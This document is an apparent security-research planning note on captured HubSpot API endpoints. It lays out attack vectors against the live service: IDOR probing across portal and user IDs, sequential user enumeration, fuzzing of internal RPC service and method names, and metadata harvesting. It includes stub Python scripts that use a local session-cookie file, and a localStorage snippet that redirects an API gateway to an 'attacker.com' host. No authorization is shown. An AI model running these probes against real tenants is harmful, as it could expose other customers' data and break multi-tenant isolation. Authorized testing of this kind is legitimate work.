# Method Endpoints Analysis

**Date:** 2025-10-17
**Source:** method_endpoints.md (authenticated API captures)
**Status:** HIGH-VALUE INTELLIGENCE

---

## Executive Summary

Captured API endpoints reveal **critical attack surface** for both Track A (GraphQL validation) and Track B (source map validation). Most significant finding: **CHIRP RPC endpoint structure CONFIRMED** with live service name, validating Track B static analysis.

**Impact:**
- ✅ Portal ID confirmed: `242862774`
- ✅ CHIRP endpoint structure validated: `/api/chirp-frontend-app/v1/gateway/{SERVICE}/{METHOD}`
- ✅ Required query parameters discovered: `hs_static_app`, `hs_static_app_version`, `portalId`
- ⚠️ IDOR testing now possible with confirmed Portal ID
- ⚠️ GraphQL may require same parameter structure

---

## Captured Endpoints

### 1. Presence API (User Status)
```
PUT /api/presence/v1/presence/portal/242862774/user/159548558
  ?hs_static_app=notifications
  &hs_static_app_version=1.11648
  &portalId=242862774
```

**Analysis:**
- Portal ID in path: `242862774`
- User ID in path: `159548558`
- App identification: `notifications v1.11648`
- Portal ID redundancy: In both path AND query param

**Attack Vectors:**
- IDOR: Change user ID to access other users' presence
- Portal enumeration: Test other portal IDs
- Version fuzzing: Test different app versions

---

### 2. Customer Object Types API
```
GET /api/customer-object-types/v1/for-portal/include-disabled
  ?portalId=242862774
  &clienttimeout=14000
  &hs_static_app=crm-index-ui
  &hs_static_app_version=2.46863
```

**Analysis:**
- Metadata retrieval endpoint
- Client timeout: 14 seconds
- App: `crm-index-ui v2.46863`
- Includes disabled objects (verbose flag)

**Attack Vectors:**
- Information disclosure via metadata
- Test without `include-disabled` flag
- Timeout manipulation

---

### 3. CHIRP RPC Gateway (🔥 HIGH VALUE)
```
POST /api/chirp-frontend-app/v1/gateway/
     com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService/
     validatePortalForGrowthProPlusExposure
  ?hs_static_app=setup-guide-ui
  &hs_static_app_version=1.50381
  &portalId=242862774
  &clienttimeout=5000
```

**Analysis:**
- **CONFIRMS TRACK B FINDING #2** ✅
- CHIRP service: `com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService`
- CHIRP method: `validatePortalForGrowthProPlusExposure`
- Gateway pattern: `/api/chirp-frontend-app/v1/gateway/{FULL_SERVICE_NAME}/{METHOD}`
- Timeout: 5 seconds (shorter than others)

**Attack Vectors:**
- Service enumeration: Fuzz service names
- Method enumeration: Fuzz method names within service
- IDOR: Test with different portal IDs
- Error leakage: Trigger errors to extract service info

**CHIRP Framework Validation:**
This endpoint **perfectly matches** Track B source map analysis:
- Source: `head-dlb-indexed.js:1004-1860` predicted CHIRP RPC framework
- Gateway pattern predicted in Apollo bundle analysis
- Error handling mechanisms now testable

---

### 4. Inbound DB Metadata API
```
GET /api/inbounddb-meta/v1/object-types/app-objects/for-portal
  ?portalId=242862774
  &clienttimeout=14000
  &hs_static_app=settings-ui-users
  &hs_static_app_version=1.55917
```

**Analysis:**
- Database metadata exposure
- App: `settings-ui-users v1.55917`
- Similar parameter pattern

**Attack Vectors:**
- Metadata enumeration
- Database structure disclosure

---

## Common Patterns Discovered

### Query Parameter Pattern (ALL Endpoints)
```
?hs_static_app={APP_NAME}
&hs_static_app_version={VERSION}
&portalId={PORTAL_ID}
&clienttimeout={MILLISECONDS}
```

**Significance:**
- Universal authentication/authorization pattern
- App identification likely used for feature flags
- Portal ID required for multi-tenant isolation
- Timeout suggests client-side control (testable)

### URL Structure Pattern
```
/api/{service-name}/{version}/{resource-path}
```

Examples:
- `/api/presence/v1/...`
- `/api/customer-object-types/v1/...`
- `/api/chirp-frontend-app/v1/...`
- `/api/inbounddb-meta/v1/...`

**Implication for GraphQL:**
GraphQL likely at: `/api/graphql/v1` or `/api/graphql`

---

## Track A: GraphQL Validation Enhancement

### Current Problem
```
POST https://app.hubspot.com/graphql → 405 Method Not Allowed
```

### New Hypothesis
GraphQL endpoint may require:
1. Full API path: `/api/graphql` instead of `/graphql`
2. Required query parameters from discovered pattern
3. App identification headers

### New Test Endpoints
```
POST /api/graphql?portalId=242862774&hs_static_app=graphql-client&hs_static_app_version=1.0
POST /api/graphql/v1?portalId=242862774&hs_static_app=crm-index-ui&hs_static_app_version=2.46863
POST /graphql?portalId=242862774&hs_static_app=apollo-client&hs_static_app_version=3.43
```

### Test Plan Updates

**Test 1: GraphQL with Portal ID and App Parameters**
```python
def test_graphql_with_params():
    url = 'https://app.hubspot.com/api/graphql'
    params = {
        'portalId': '242862774',
        'hs_static_app': 'apollo-client',
        'hs_static_app_version': '3.43',
        'clienttimeout': '10000'
    }
    # Add to URL as query string
```

**Test 2: Mimic Existing App Structure**
```python
# Use same app identifiers from working endpoints
apps_to_test = [
    ('crm-index-ui', '2.46863'),
    ('setup-guide-ui', '1.50381'),
    ('settings-ui-users', '1.55917'),
]
```

**Test 3: CHIRP as Alternative to GraphQL**
Since we have working CHIRP endpoints, test if CHIRP can be used for data access:
```
POST /api/chirp-frontend-app/v1/gateway/{SERVICE}/{METHOD}
```

---

## Track B: Validation & Exploitation Enhancement

### Track B Finding Confirmations

#### ✅ FINDING #2: CHIRP RPC Framework - **FULLY VALIDATED**

**Original Finding (Track B):**
- Source: `head-dlb-indexed.js:1004-1860`
- Claim: CHIRP RPC error framework exists

**Validation (method_endpoints.md):**
```
LIVE CHIRP ENDPOINT DISCOVERED:
/api/chirp-frontend-app/v1/gateway/
  com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService/
  validatePortalForGrowthProPlusExposure
```

**Confidence Upgrade:** HIGH ⭐⭐⭐ → **CRITICAL** ⭐⭐⭐⭐⭐

**New Attack Vectors:**

1. **CHIRP Service Enumeration**
   ```python
   # Fuzz service names based on discovered pattern:
   # com.hubspot.{department}.{feature}.rpc.server.{ServiceName}ChirpService

   services_to_test = [
       'com.hubspot.contacts.rpc.server.ContactsChirpService',
       'com.hubspot.companies.rpc.server.CompaniesChirpService',
       'com.hubspot.deals.rpc.server.DealsChirpService',
       'com.hubspot.auth.rpc.server.AuthChirpService',
       'com.hubspot.users.rpc.server.UsersChirpService',
   ]
   ```

2. **CHIRP Method Enumeration**
   ```python
   # Common RPC methods to test:
   methods = [
       'get', 'create', 'update', 'delete',
       'getById', 'getByPortal', 'listAll',
       'validate', 'verify', 'check',
   ]
   ```

3. **CHIRP Error Message Extraction**
   ```python
   # Trigger errors to extract:
   # - Available service names
   # - Available method names
   # - Parameter requirements
   # - Internal service paths
   ```

#### ✅ FINDING #3: Portal ID Extraction - **FULLY VALIDATED**

**Original Finding (Track B):**
- Source: `head-dlb-indexed.js:4500-4545` (PortalIdParser)
- Claim: Portal IDs in URLs and query params

**Validation (method_endpoints.md):**
```
Portal ID: 242862774
Present in:
  - URL paths: /portal/242862774/
  - Query params: ?portalId=242862774
  - BOTH simultaneously (redundant checking)
```

**Confidence Upgrade:** MEDIUM ⭐⭐ → **CRITICAL** ⭐⭐⭐⭐⭐

**New Attack Vectors:**

1. **IDOR Testing**
   ```python
   # Test all endpoints with different portal IDs
   portal_ids_to_test = [
       '242862774',  # Known valid
       '242862775',  # Sequential
       '100000000',  # Low ID
       '999999999',  # High ID
   ]

   # Test each endpoint with modified portal IDs:
   for portal_id in portal_ids_to_test:
       test_presence_api(portal_id, user_id='159548558')
       test_chirp_gateway(portal_id)
       test_customer_objects(portal_id)
   ```

2. **Portal Enumeration**
   ```python
   # Identify valid portal IDs by response differences:
   # - 200 OK: Valid portal
   # - 403 Forbidden: Valid portal, no access
   # - 404 Not Found: Invalid portal
   ```

3. **Multi-Tenant Isolation Bypass**
   ```python
   # Test if query param portalId overrides path portalId:
   url = f'/api/presence/v1/presence/portal/242862774/user/159548558'
   params = {'portalId': '999999999'}  # Different portal ID
   # Does this bypass isolation?
   ```

---

## New High-Value Targets

### 1. User ID Enumeration
```
PUT /api/presence/v1/presence/portal/{PORTAL_ID}/user/{USER_ID}
```

**Test:**
- User ID: `159548558` (discovered)
- Test sequential IDs: 159548559, 159548560, etc.
- Test if user presence reveals active users

### 2. CHIRP Service Discovery
```
POST /api/chirp-frontend-app/v1/gateway/{FUZZ_SERVICE}/{FUZZ_METHOD}
```

**Test:**
- Use Nuclei or ffuf to fuzz service names
- Monitor for different error messages
- Extract service names from errors

### 3. Metadata Harvesting
```
GET /api/customer-object-types/v1/for-portal/include-disabled
GET /api/inbounddb-meta/v1/object-types/app-objects/for-portal
```

**Test:**
- Extract all object type definitions
- Look for custom objects
- Check for sensitive field definitions

---

## Recommended Testing Scripts

### Script 1: GraphQL with Discovered Parameters
```python
# /tmp/test_graphql_with_params.py
import urllib.request
import json
import ssl

cookie_file = '/Users/itza/Documents/vault_self/bcck_vault/LEARNING/targets/hubspot/cookies.txt'
# Parse Netscape cookies...

base_url = 'https://app.hubspot.com'
endpoints_to_test = [
    '/graphql',
    '/api/graphql',
    '/api/graphql/v1',
]

params = {
    'portalId': '242862774',
    'hs_static_app': 'apollo-client',
    'hs_static_app_version': '3.43',
    'clienttimeout': '10000',
}

for endpoint in endpoints_to_test:
    url = f"{base_url}{endpoint}?" + "&".join([f"{k}={v}" for k, v in params.items()])
    # Test POST with GraphQL query
```

### Script 2: CHIRP Service Enumeration
```python
# /tmp/test_chirp_enumeration.py

chirp_base = 'https://app.hubspot.com/api/chirp-frontend-app/v1/gateway'

# Known working service
known_service = 'com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService'

# Services to test (based on naming pattern)
services_to_test = [
    'com.hubspot.contacts.rpc.server.ContactsChirpService',
    'com.hubspot.auth.rpc.server.AuthChirpService',
    # ... more services
]

methods_to_test = [
    'get', 'getById', 'list', 'search',
    'validate', 'verify', 'check',
]

for service in services_to_test:
    for method in methods_to_test:
        url = f"{chirp_base}/{service}/{method}"
        # Test with portal ID params
```

### Script 3: IDOR Portal Testing
```python
# /tmp/test_portal_idor.py

portal_id = '242862774'
user_id = '159548558'

# Test with different portal IDs
test_portal_ids = [
    portal_id,  # Valid
    str(int(portal_id) + 1),  # Sequential
    str(int(portal_id) - 1),
    '100000000',  # Random
]

endpoints_to_test = [
    f'/api/presence/v1/presence/portal/{{}}/user/{user_id}',
    f'/api/customer-object-types/v1/for-portal/include-disabled',
    f'/api/chirp-frontend-app/v1/gateway/com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService/validatePortalForGrowthProPlusExposure',
]

# Test each endpoint with each portal ID
# Monitor for:
# - 200 OK (successful IDOR)
# - 403 Forbidden (failed but portal exists)
# - 404 Not Found (portal doesn't exist)
```

---

## Integration with Existing Work

### From Track-B-Peer-Review-Validation.md

**NEW localStorage keys to test with these endpoints:**
```javascript
// Test if these affect API behavior:
localStorage.setItem('LOCAL_API_OVERRIDES', JSON.stringify({
  '/api/chirp-frontend-app/v1/gateway': 'https://attacker.com/chirp'
}));

localStorage.setItem('HTTP_FAILURE_INJECTION', 'true');
localStorage.setItem('WHISPER_CORE_DEV', 'true');

// Then test CHIRP endpoints to see if overrides take effect
```

---

## Priority Action Items

### Immediate (HIGH Priority)

1. **Test GraphQL with Portal ID parameters**
   - Create script: `/tmp/test_graphql_with_params.py`
   - Test all 3 potential GraphQL paths
   - Include all discovered query parameters

2. **CHIRP Service Enumeration**
   - Create script: `/tmp/test_chirp_enumeration.py`
   - Fuzz 50-100 common service names
   - Extract error messages for intel

3. **Portal IDOR Testing**
   - Create script: `/tmp/test_portal_idor.py`
   - Test all 4 captured endpoints
   - Test 10-20 portal ID variations

### Secondary (MEDIUM Priority)

4. **User ID Enumeration**
   - Test presence API with user ID fuzzing
   - Identify valid user IDs in portal

5. **Metadata Harvesting**
   - Extract all object type definitions
   - Map database schema

6. **localStorage Integration**
   - Test if LOCAL_API_OVERRIDES affects these endpoints
   - Test HTTP_FAILURE_INJECTION behavior

---

## Summary

**Validation Status:**
- Track B Finding #2 (CHIRP): MEDIUM → **CRITICAL** ⭐⭐⭐⭐⭐
- Track B Finding #3 (Portal ID): MEDIUM → **CRITICAL** ⭐⭐⭐⭐⭐

**New Attack Surface:**
- Portal ID: `242862774` (confirmed valid)
- User ID: `159548558` (confirmed valid)
- CHIRP Service: Full service name discovered
- Query Pattern: All endpoints use `hs_static_app`, `hs_static_app_version`, `portalId`

**Track A Impact:**
GraphQL testing can now include:
- Correct query parameters
- Valid portal ID
- Proper app identification
- Alternative endpoint paths

**Track B Impact:**
- CHIRP framework fully validated
- IDOR testing now possible with confirmed IDs
- Service enumeration targets identified
- Multi-tenant isolation testing enabled

**ROI:** 4 captured endpoints → 3 critical findings validated + 5 new high-value attack vectors

---

**Analysis Date:** 2025-10-17
**Analyst:** Chavvo DA
**Status:** READY FOR EXPLOITATION TESTING ✅
